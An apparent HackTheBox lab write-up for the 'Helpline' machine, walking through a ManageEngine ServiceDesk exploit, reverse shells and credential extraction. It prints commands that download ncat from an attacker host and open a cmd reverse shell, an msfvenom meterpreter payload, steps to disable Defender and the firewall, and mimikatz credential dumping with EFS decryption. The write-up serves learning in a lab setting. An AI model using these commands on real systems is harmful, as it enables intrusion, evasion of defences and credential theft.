---
title: "HackTheBox - WriteUp 13"
date: 2019-07-13T22:31:09+08:00
description: "HackTheBox 练手 - Helpline - Encrypted File System on Windows"
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# Helpline

Difficulty: 8.2/10

Nmap:135,445(SMB),8080(Tomcat Service Desk),5985(Windows Remote Management Port),49667(MSRPC Support)

# User

First, we know there's port 8080, the footer showed us this software version is Zoho ManageEngine ServiceDesk v9.3, we use searchsploit, and find Exploit-DBID: 46674. Access [the blog](https://flameofignis.com/en/vuln/CVE-2019-10008) this text file mentioned, do some modification. With the default `guest:guest` credentials and modified cookies here, you're able to access as administrator of ServiceDesk, download the PoC, and change the host `host="10.10.10.132:8080"`, that's all.

After that, create Technician Account as you want and give the SDAdmin privilege, this will help you maintain the administrator privilege even you get logged out.

Prepare a static-linked binary called `ncat.exe`, and use the following two commands to create two custom triggers when met the condition you set. Don't forget to set up a web server first.

First:  `powershell -exec bypass -c Invoke-WebRequest http://10.10.14.6:8080/ncat.exe -OutFile nc.exe`

Second: `cmd /c nc.exe 10.10.14.6 4455 -e cmd.exe`

Now you'll get the shell as `nt authority/system`, however, since this box enabled Encrypted NTFS (EFS in abbr), you can't read the flag now. We can only know from the prompt at the beginning that this server is based on Windows 10 17763(Build 1809), which might also be Windows Server 2016.

Use `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=7777 -f exe > test.exe` to generate a meterpreter trojan for preparation.

Run `powershell` in the shell you just got, and execute the following command to disable Windows defender and firewall:

```powershell
PS > Set-MpPreference -DisableRealtimeMonitoring $true 
PS > Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

Don't try to enable RDP, group policy prevent you from logged in.

Upload meterpreter trojan, then execute, access it via `exploit/multi/handler` with the same payload and payload param. It would be perfect if you upload the whole `mimikatz` binary to the victim now.

## Read the user flag

### RDP/VNC

In meterpreter shell, run `migrate 2878` to migrate the meterpreter core to a process owned by leo, then `msfvenom` generate a `vncinject` trojan, upload and run. You can directly access the user.txt flag.

### Hardcore: CLI Only

Get another meterpreter shell using the same method above, in order to maintain the privilege of `nt authority/system`.

First use `$Env:PSModulePath` in powershell to check whether to save our powershell script. Following [the readme in Powersploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) , Then run `Get-RegistryAutoLogon`, you'll get the password of the leo.

OR, you can also use `mimikatz` built inside the meterpreter with `load kiwi`, issue `creds_all`, or issue `sekurlsa::logonpasswords` in pure mimikatz you'll get sha1 hash of leo's password.

Then just follow the direction of mimikatz wiki [How to decrypt EFS Files - Mimikatz](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files), you'll get User flag.

# Root

Grab you shell, `get-eventlog security | export-clixml C:\temp\opt1.xml`, download the output system security eventlog, `cat opt1.xml | grep -n tolu | grep -n net` in your local bash, you'll find the password of tolu. Use tolu's password, follow the mimikatz wiki, you can decrypt `admin-pass.xml`, and find a string called `SecureString` in powershell, you should use the following commnad to decrypt it and get the plaintext password, run it with leo's account using the meterpreter shell you just got.

```powershell
$SecuredPWD = Get-Content C:\fakepath\admin-pass.xml
$SecureStringAsPlainText = $SecuredPWD | ConvertTo-SecureString
$cred = new-object System.Management.Automation.PSCredential 'HELPLINE\Administrator',$SecureStringAsPlainText
$cred.GetNetworkCredential() | fl
```

Then,since you have the plaintext credential of administrator, decrypt the root flag again using the same method, you'll get it.


(END)

# Referrence

- https://flameofignis.com/en/vuln/CVE-2019-10008
- https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/
- https://www.hackingarticles.in/post-exploitation-remote-windows-password/
- https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
- https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- https://eventlogxp.com/blog/exporting-event-logs-with-windows-powershell/
- https://stackoverflow.com/questions/46547174/is-there-a-way-to-use-convertfrom-securestring-and-convertto-securestring-with-a
- https://www.itprotoday.com/powershell/powershell-makes-security-log-access-easy
- https://www.youtube.com/watch?v=ob9SgtFm6_g  IPPSEC-Reel-HacktheBox
